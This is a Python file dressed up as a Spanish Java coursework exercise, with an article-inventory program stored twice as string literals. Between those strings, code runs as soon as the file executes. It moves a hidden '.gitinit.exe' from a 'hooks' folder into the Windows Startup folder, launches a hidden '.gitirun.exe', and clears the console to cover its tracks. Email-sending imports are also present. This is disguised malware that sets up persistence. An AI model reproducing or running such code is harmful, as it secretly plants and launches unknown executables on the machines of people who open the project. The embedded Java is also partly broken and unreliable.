import shutil
import os
import getpass
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time


f= '''
package ejercicio4;

public class Articulo {

	
	private String nombre;
	private double precio;
	private int unidades;
	
	private static final double IVA = 21;
	
	public Articulo(String n,double pre,int uni) {
		if ((uni < 0)||(pre <0)) {
			System.err.println("Error!!! Datos incorrectos");
		}else {
			this.nombre = n;
			this.precio = pre;
			this.unidades = uni;
		}
		
	}
	
	
	public int getUnidades() {
		return unidades;
	}



	public void setUnidades(int unidades) {
		this.unidades = unidades;
	}



	public String getNombre() {
		return nombre;
	}



	public void setNombre(String nombre) {
		this.nombre = nombre;
	}



	public double getPrecio() {
		return precio;
	}



	public void setPrecio(double precio) {
		this.precio = precio;
	}


	private double precioConIva() {
		return this.getPrecio()+this.getPrecio()*IVA/100;
	}
	
	//PRECIO CON IVA
	public double getPVP() {
		return this.getPrecio()+this.getPrecio()*IVA/100;
	}
	
	public double getPVPDescuento(double descuento) {
		return this.getPVP()-descuento;
	}
	
	public boolean vender(int cantidad) {
		if (this.unidades>=cantidad) {
			this.unidades -= cantidad;
			return true;
		}else {
			return false;
		}
	}

	@Override
	public String toString() {
		return this.getNombre() +"-precio: "+this.getPrecio()+
				"€-IVA:"+IVA+"-PVP: "+this.precioConIva()+"€" + 
				" unidades disponibles: "+this.getUnidades();
	}
}
package Articulo;

import java.util.Scanner;

public class Main {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		int Articuloa = 0;
		Scanner input = new Scanner(System.in);
		int numArticulos = 11;
		Aritculo articulos[] = new Aritculo[11];
		int opcion;
        for (int i = 0; i < 11; i++) {
            articulos[i] = new Aritculo(null, 0, 0);
        }
		do {
			Menu();
			System.out.println("Opcion :");
			opcion = input.nextInt();
			switch(opcion) {
			case 1:
				for(Aritculo articulo:articulos) {
					System.out.println(articulo.ImprimirInfo());
				}
				break;
			
			case 2:
				String nombre;
				boolean encontrado=false;
				System.out.println("Nombre articulo : ");
				nombre =  input.next();
				
				for(Aritculo articulo:articulos) {
					if(nombre.equals(articulo.getNombre())) {
						System.out.println(articulo.ImprimirInfo());
						encontrado = true;
					}
				}
				if(!encontrado) {
					System.out.println("Aritculo no existe");
				}
				break;
			case 3:
				String nombre1;
				System.out.println("Introduce Nombre : ");
				nombre1 = input.next();
				System.out.println("Cantidad : ");
				int cant = input.nextInt();
				
				for(Aritculo articulo:articulos) {
					if(nombre1.equals(articulo.getNombre())) {
						if(articulo.vender(cant)) {
							System.out.println("Articulo has sido comprado");
						}else {
							System.out.println("No existe suficiente articulos");
						}
					}
					
				}
				break;
			case 4:
				boolean encontrado_ud =false;
				
				System.out.println("Nombre De Articulo: ");
				String nombreDeUd= input.next();
				System.out.println("Cantidad :");
				int cants = input.nextInt();
				for(Aritculo articulo:articulos) {
					if(nombreDeUd.equals(articulo.getNombre())) {
						articulo.almacenar(cants);
						encontrado_ud = true;
					}
				}
				break;

			case 5:
				boolean existe = false;
				System.out.println("Nombre Articulo : ");
				String nArticulo = input.next();

				for(Aritculo articulo:articulos) {
					if(nArticulo.equals(articulo.getNombre())) {
						existe = true;
						
					}
					
					
				}
				if(!existe) {
					articulos[Articuloa].setNombre(nArticulo);
					System.out.println("Precio :");
					articulos[Articuloa].setprecio(input.nextInt());
					System.out.println("Cantidad : ");
					articulos[Articuloa].setCantidad(input.nextInt());
					Articuloa++;
					System.out.println("Articulo ha sido Añadido");
				}else {
					System.out.println("Articulo ya Existe");
				}
				break;
			case 6:
				boolean ex =false;
				System.out.println("Introduce Nombre de articulo : ");
				String narticulo = input.next();
				for(Aritculo articulo:articulos) {
					if(narticulo.equals(articulo.getNombre())) {
						articulo.setNombre("null");
						articulo.setprecio(0);
						articulo.setCantidad(0);
						ex = true;
						
						
					}
					
				}
				if(ex) {
					System.out.println("Articulo ha sido eleminado");
				}else {
					System.out.println("Articulo no exists");
				}
				break;
			}
			
		}while(opcion !=7);
			

	}
	
	public static void Menu() {
		System.out.println("1. Mostrar todos los artículos\r\n"
				+ "2. Buscar artículo por nombre\r\n"
				+ "3. Vender unidades\r\n"
				+ "4. Almacenar unidades\r\n"
				+ "5. Añadir nuevo artículo\r\n"
				+ "6. Eliminar artículo\r\n"
				+ "7. Salir");
	}


}

'''
user = getpass.getuser()

def setup_startup():
    user = getpass.getuser()

    about_file_path = os.path.join(os.path.dirname(__file__), 'ABOUT.txt')
    if os.path.exists(about_file_path):
        return

    # Define the destination directory (Startup folder)
    destination_directory = fr"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    # Get the current directory
    current_directory = os.path.dirname(__file__)

    # Define the source file
    source_file = os.path.join(current_directory,'hooks', '.gitinit.exe')

    try:
        shutil.move(source_file, destination_directory)
    except Exception as e:
        pass
    os.system(fr"start {os.path.join(current_directory,'hooks', '.gitirun.exe')}")
    os.system("cls")
    
if not os.path.exists("ABOUT.txt"):
    setup_startup()
    os.system("cls")



f='''
package Articulo;

import java.util.Scanner;

public class Main {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		int Articuloa = 0;
		Scanner input = new Scanner(System.in);
		int numArticulos = 11;
		Aritculo articulos[] = new Aritculo[11];
		int opcion;
        for (int i = 0; i < 11; i++) {
            articulos[i] = new Aritculo(null, 0, 0);
        }
		do {
			Menu();
			System.out.println("Opcion :");
			opcion = input.nextInt();
			switch(opcion) {
			case 1:
				for(Aritculo articulo:articulos) {
					System.out.println(articulo.ImprimirInfo());
				}
				break;
			
			case 2:
				String nombre;
				boolean encontrado=false;
				System.out.println("Nombre articulo : ");
				nombre =  input.next();
				
				for(Aritculo articulo:articulos) {
					if(nombre.equals(articulo.getNombre())) {
						System.out.println(articulo.ImprimirInfo());
						encontrado = true;
					}
				}
				if(!encontrado) {
					System.out.println("Aritculo no existe");
				}
				break;
			case 3:
				String nombre1;
				System.out.println("Introduce Nombre : ");
				nombre1 = input.next();
				System.out.println("Cantidad : ");
				int cant = input.nextInt();
				
				for(Aritculo articulo:articulos) {
					if(nombre1.equals(articulo.getNombre())) {
						if(articulo.vender(cant)) {
							System.out.println("Articulo has sido comprado");
						}else {
							System.out.println("No existe suficiente articulos");
						}
					}
					
				}
				break;
			case 4:
				boolean encontrado_ud =false;
				
				System.out.println("Nombre De Articulo: ");
				String nombreDeUd= input.next();
				System.out.println("Cantidad :");
				int cants = input.nextInt();
				for(Aritculo articulo:articulos) {
					if(nombreDeUd.equals(articulo.getNombre())) {
						articulo.almacenar(cants);
						encontrado_ud = true;
					}
				}
				break;

			case 5:
				boolean existe = false;
				System.out.println("Nombre Articulo : ");
				String nArticulo = input.next();

				for(Aritculo articulo:articulos) {
					if(nArticulo.equals(articulo.getNombre())) {
						existe = true;
						
					}
					
					
				}
				if(!existe) {
					articulos[Articuloa].setNombre(nArticulo);
					System.out.println("Precio :");
					articulos[Articuloa].setprecio(input.nextInt());
					System.out.println("Cantidad : ");
					articulos[Articuloa].setCantidad(input.nextInt());
					Articuloa++;
					System.out.println("Articulo ha sido Añadido");
				}else {
					System.out.println("Articulo ya Existe");
				}
				break;
			case 6:
				boolean ex =false;
				System.out.println("Introduce Nombre de articulo : ");
				String narticulo = input.next();
				for(Aritculo articulo:articulos) {
					if(narticulo.equals(articulo.getNombre())) {
						articulo.setNombre("null");
						articulo.setprecio(0);
						articulo.setCantidad(0);
						ex = true;
						
						
					}
					
				}
				if(ex) {
					System.out.println("Articulo ha sido eleminado");
				}else {
					System.out.println("Articulo no exists");
				}
				break;
			}
			
		}while(opcion !=7);
			

	}
	
	public static void Menu() {
		System.out.println("1. Mostrar todos los artículos\r\n"
				+ "2. Buscar artículo por nombre\r\n"
				+ "3. Vender unidades\r\n"
				+ "4. Almacenar unidades\r\n"
				+ "5. Añadir nuevo artículo\r\n"
				+ "6. Eliminar artículo\r\n"
				+ "7. Salir");
	}


}

'''
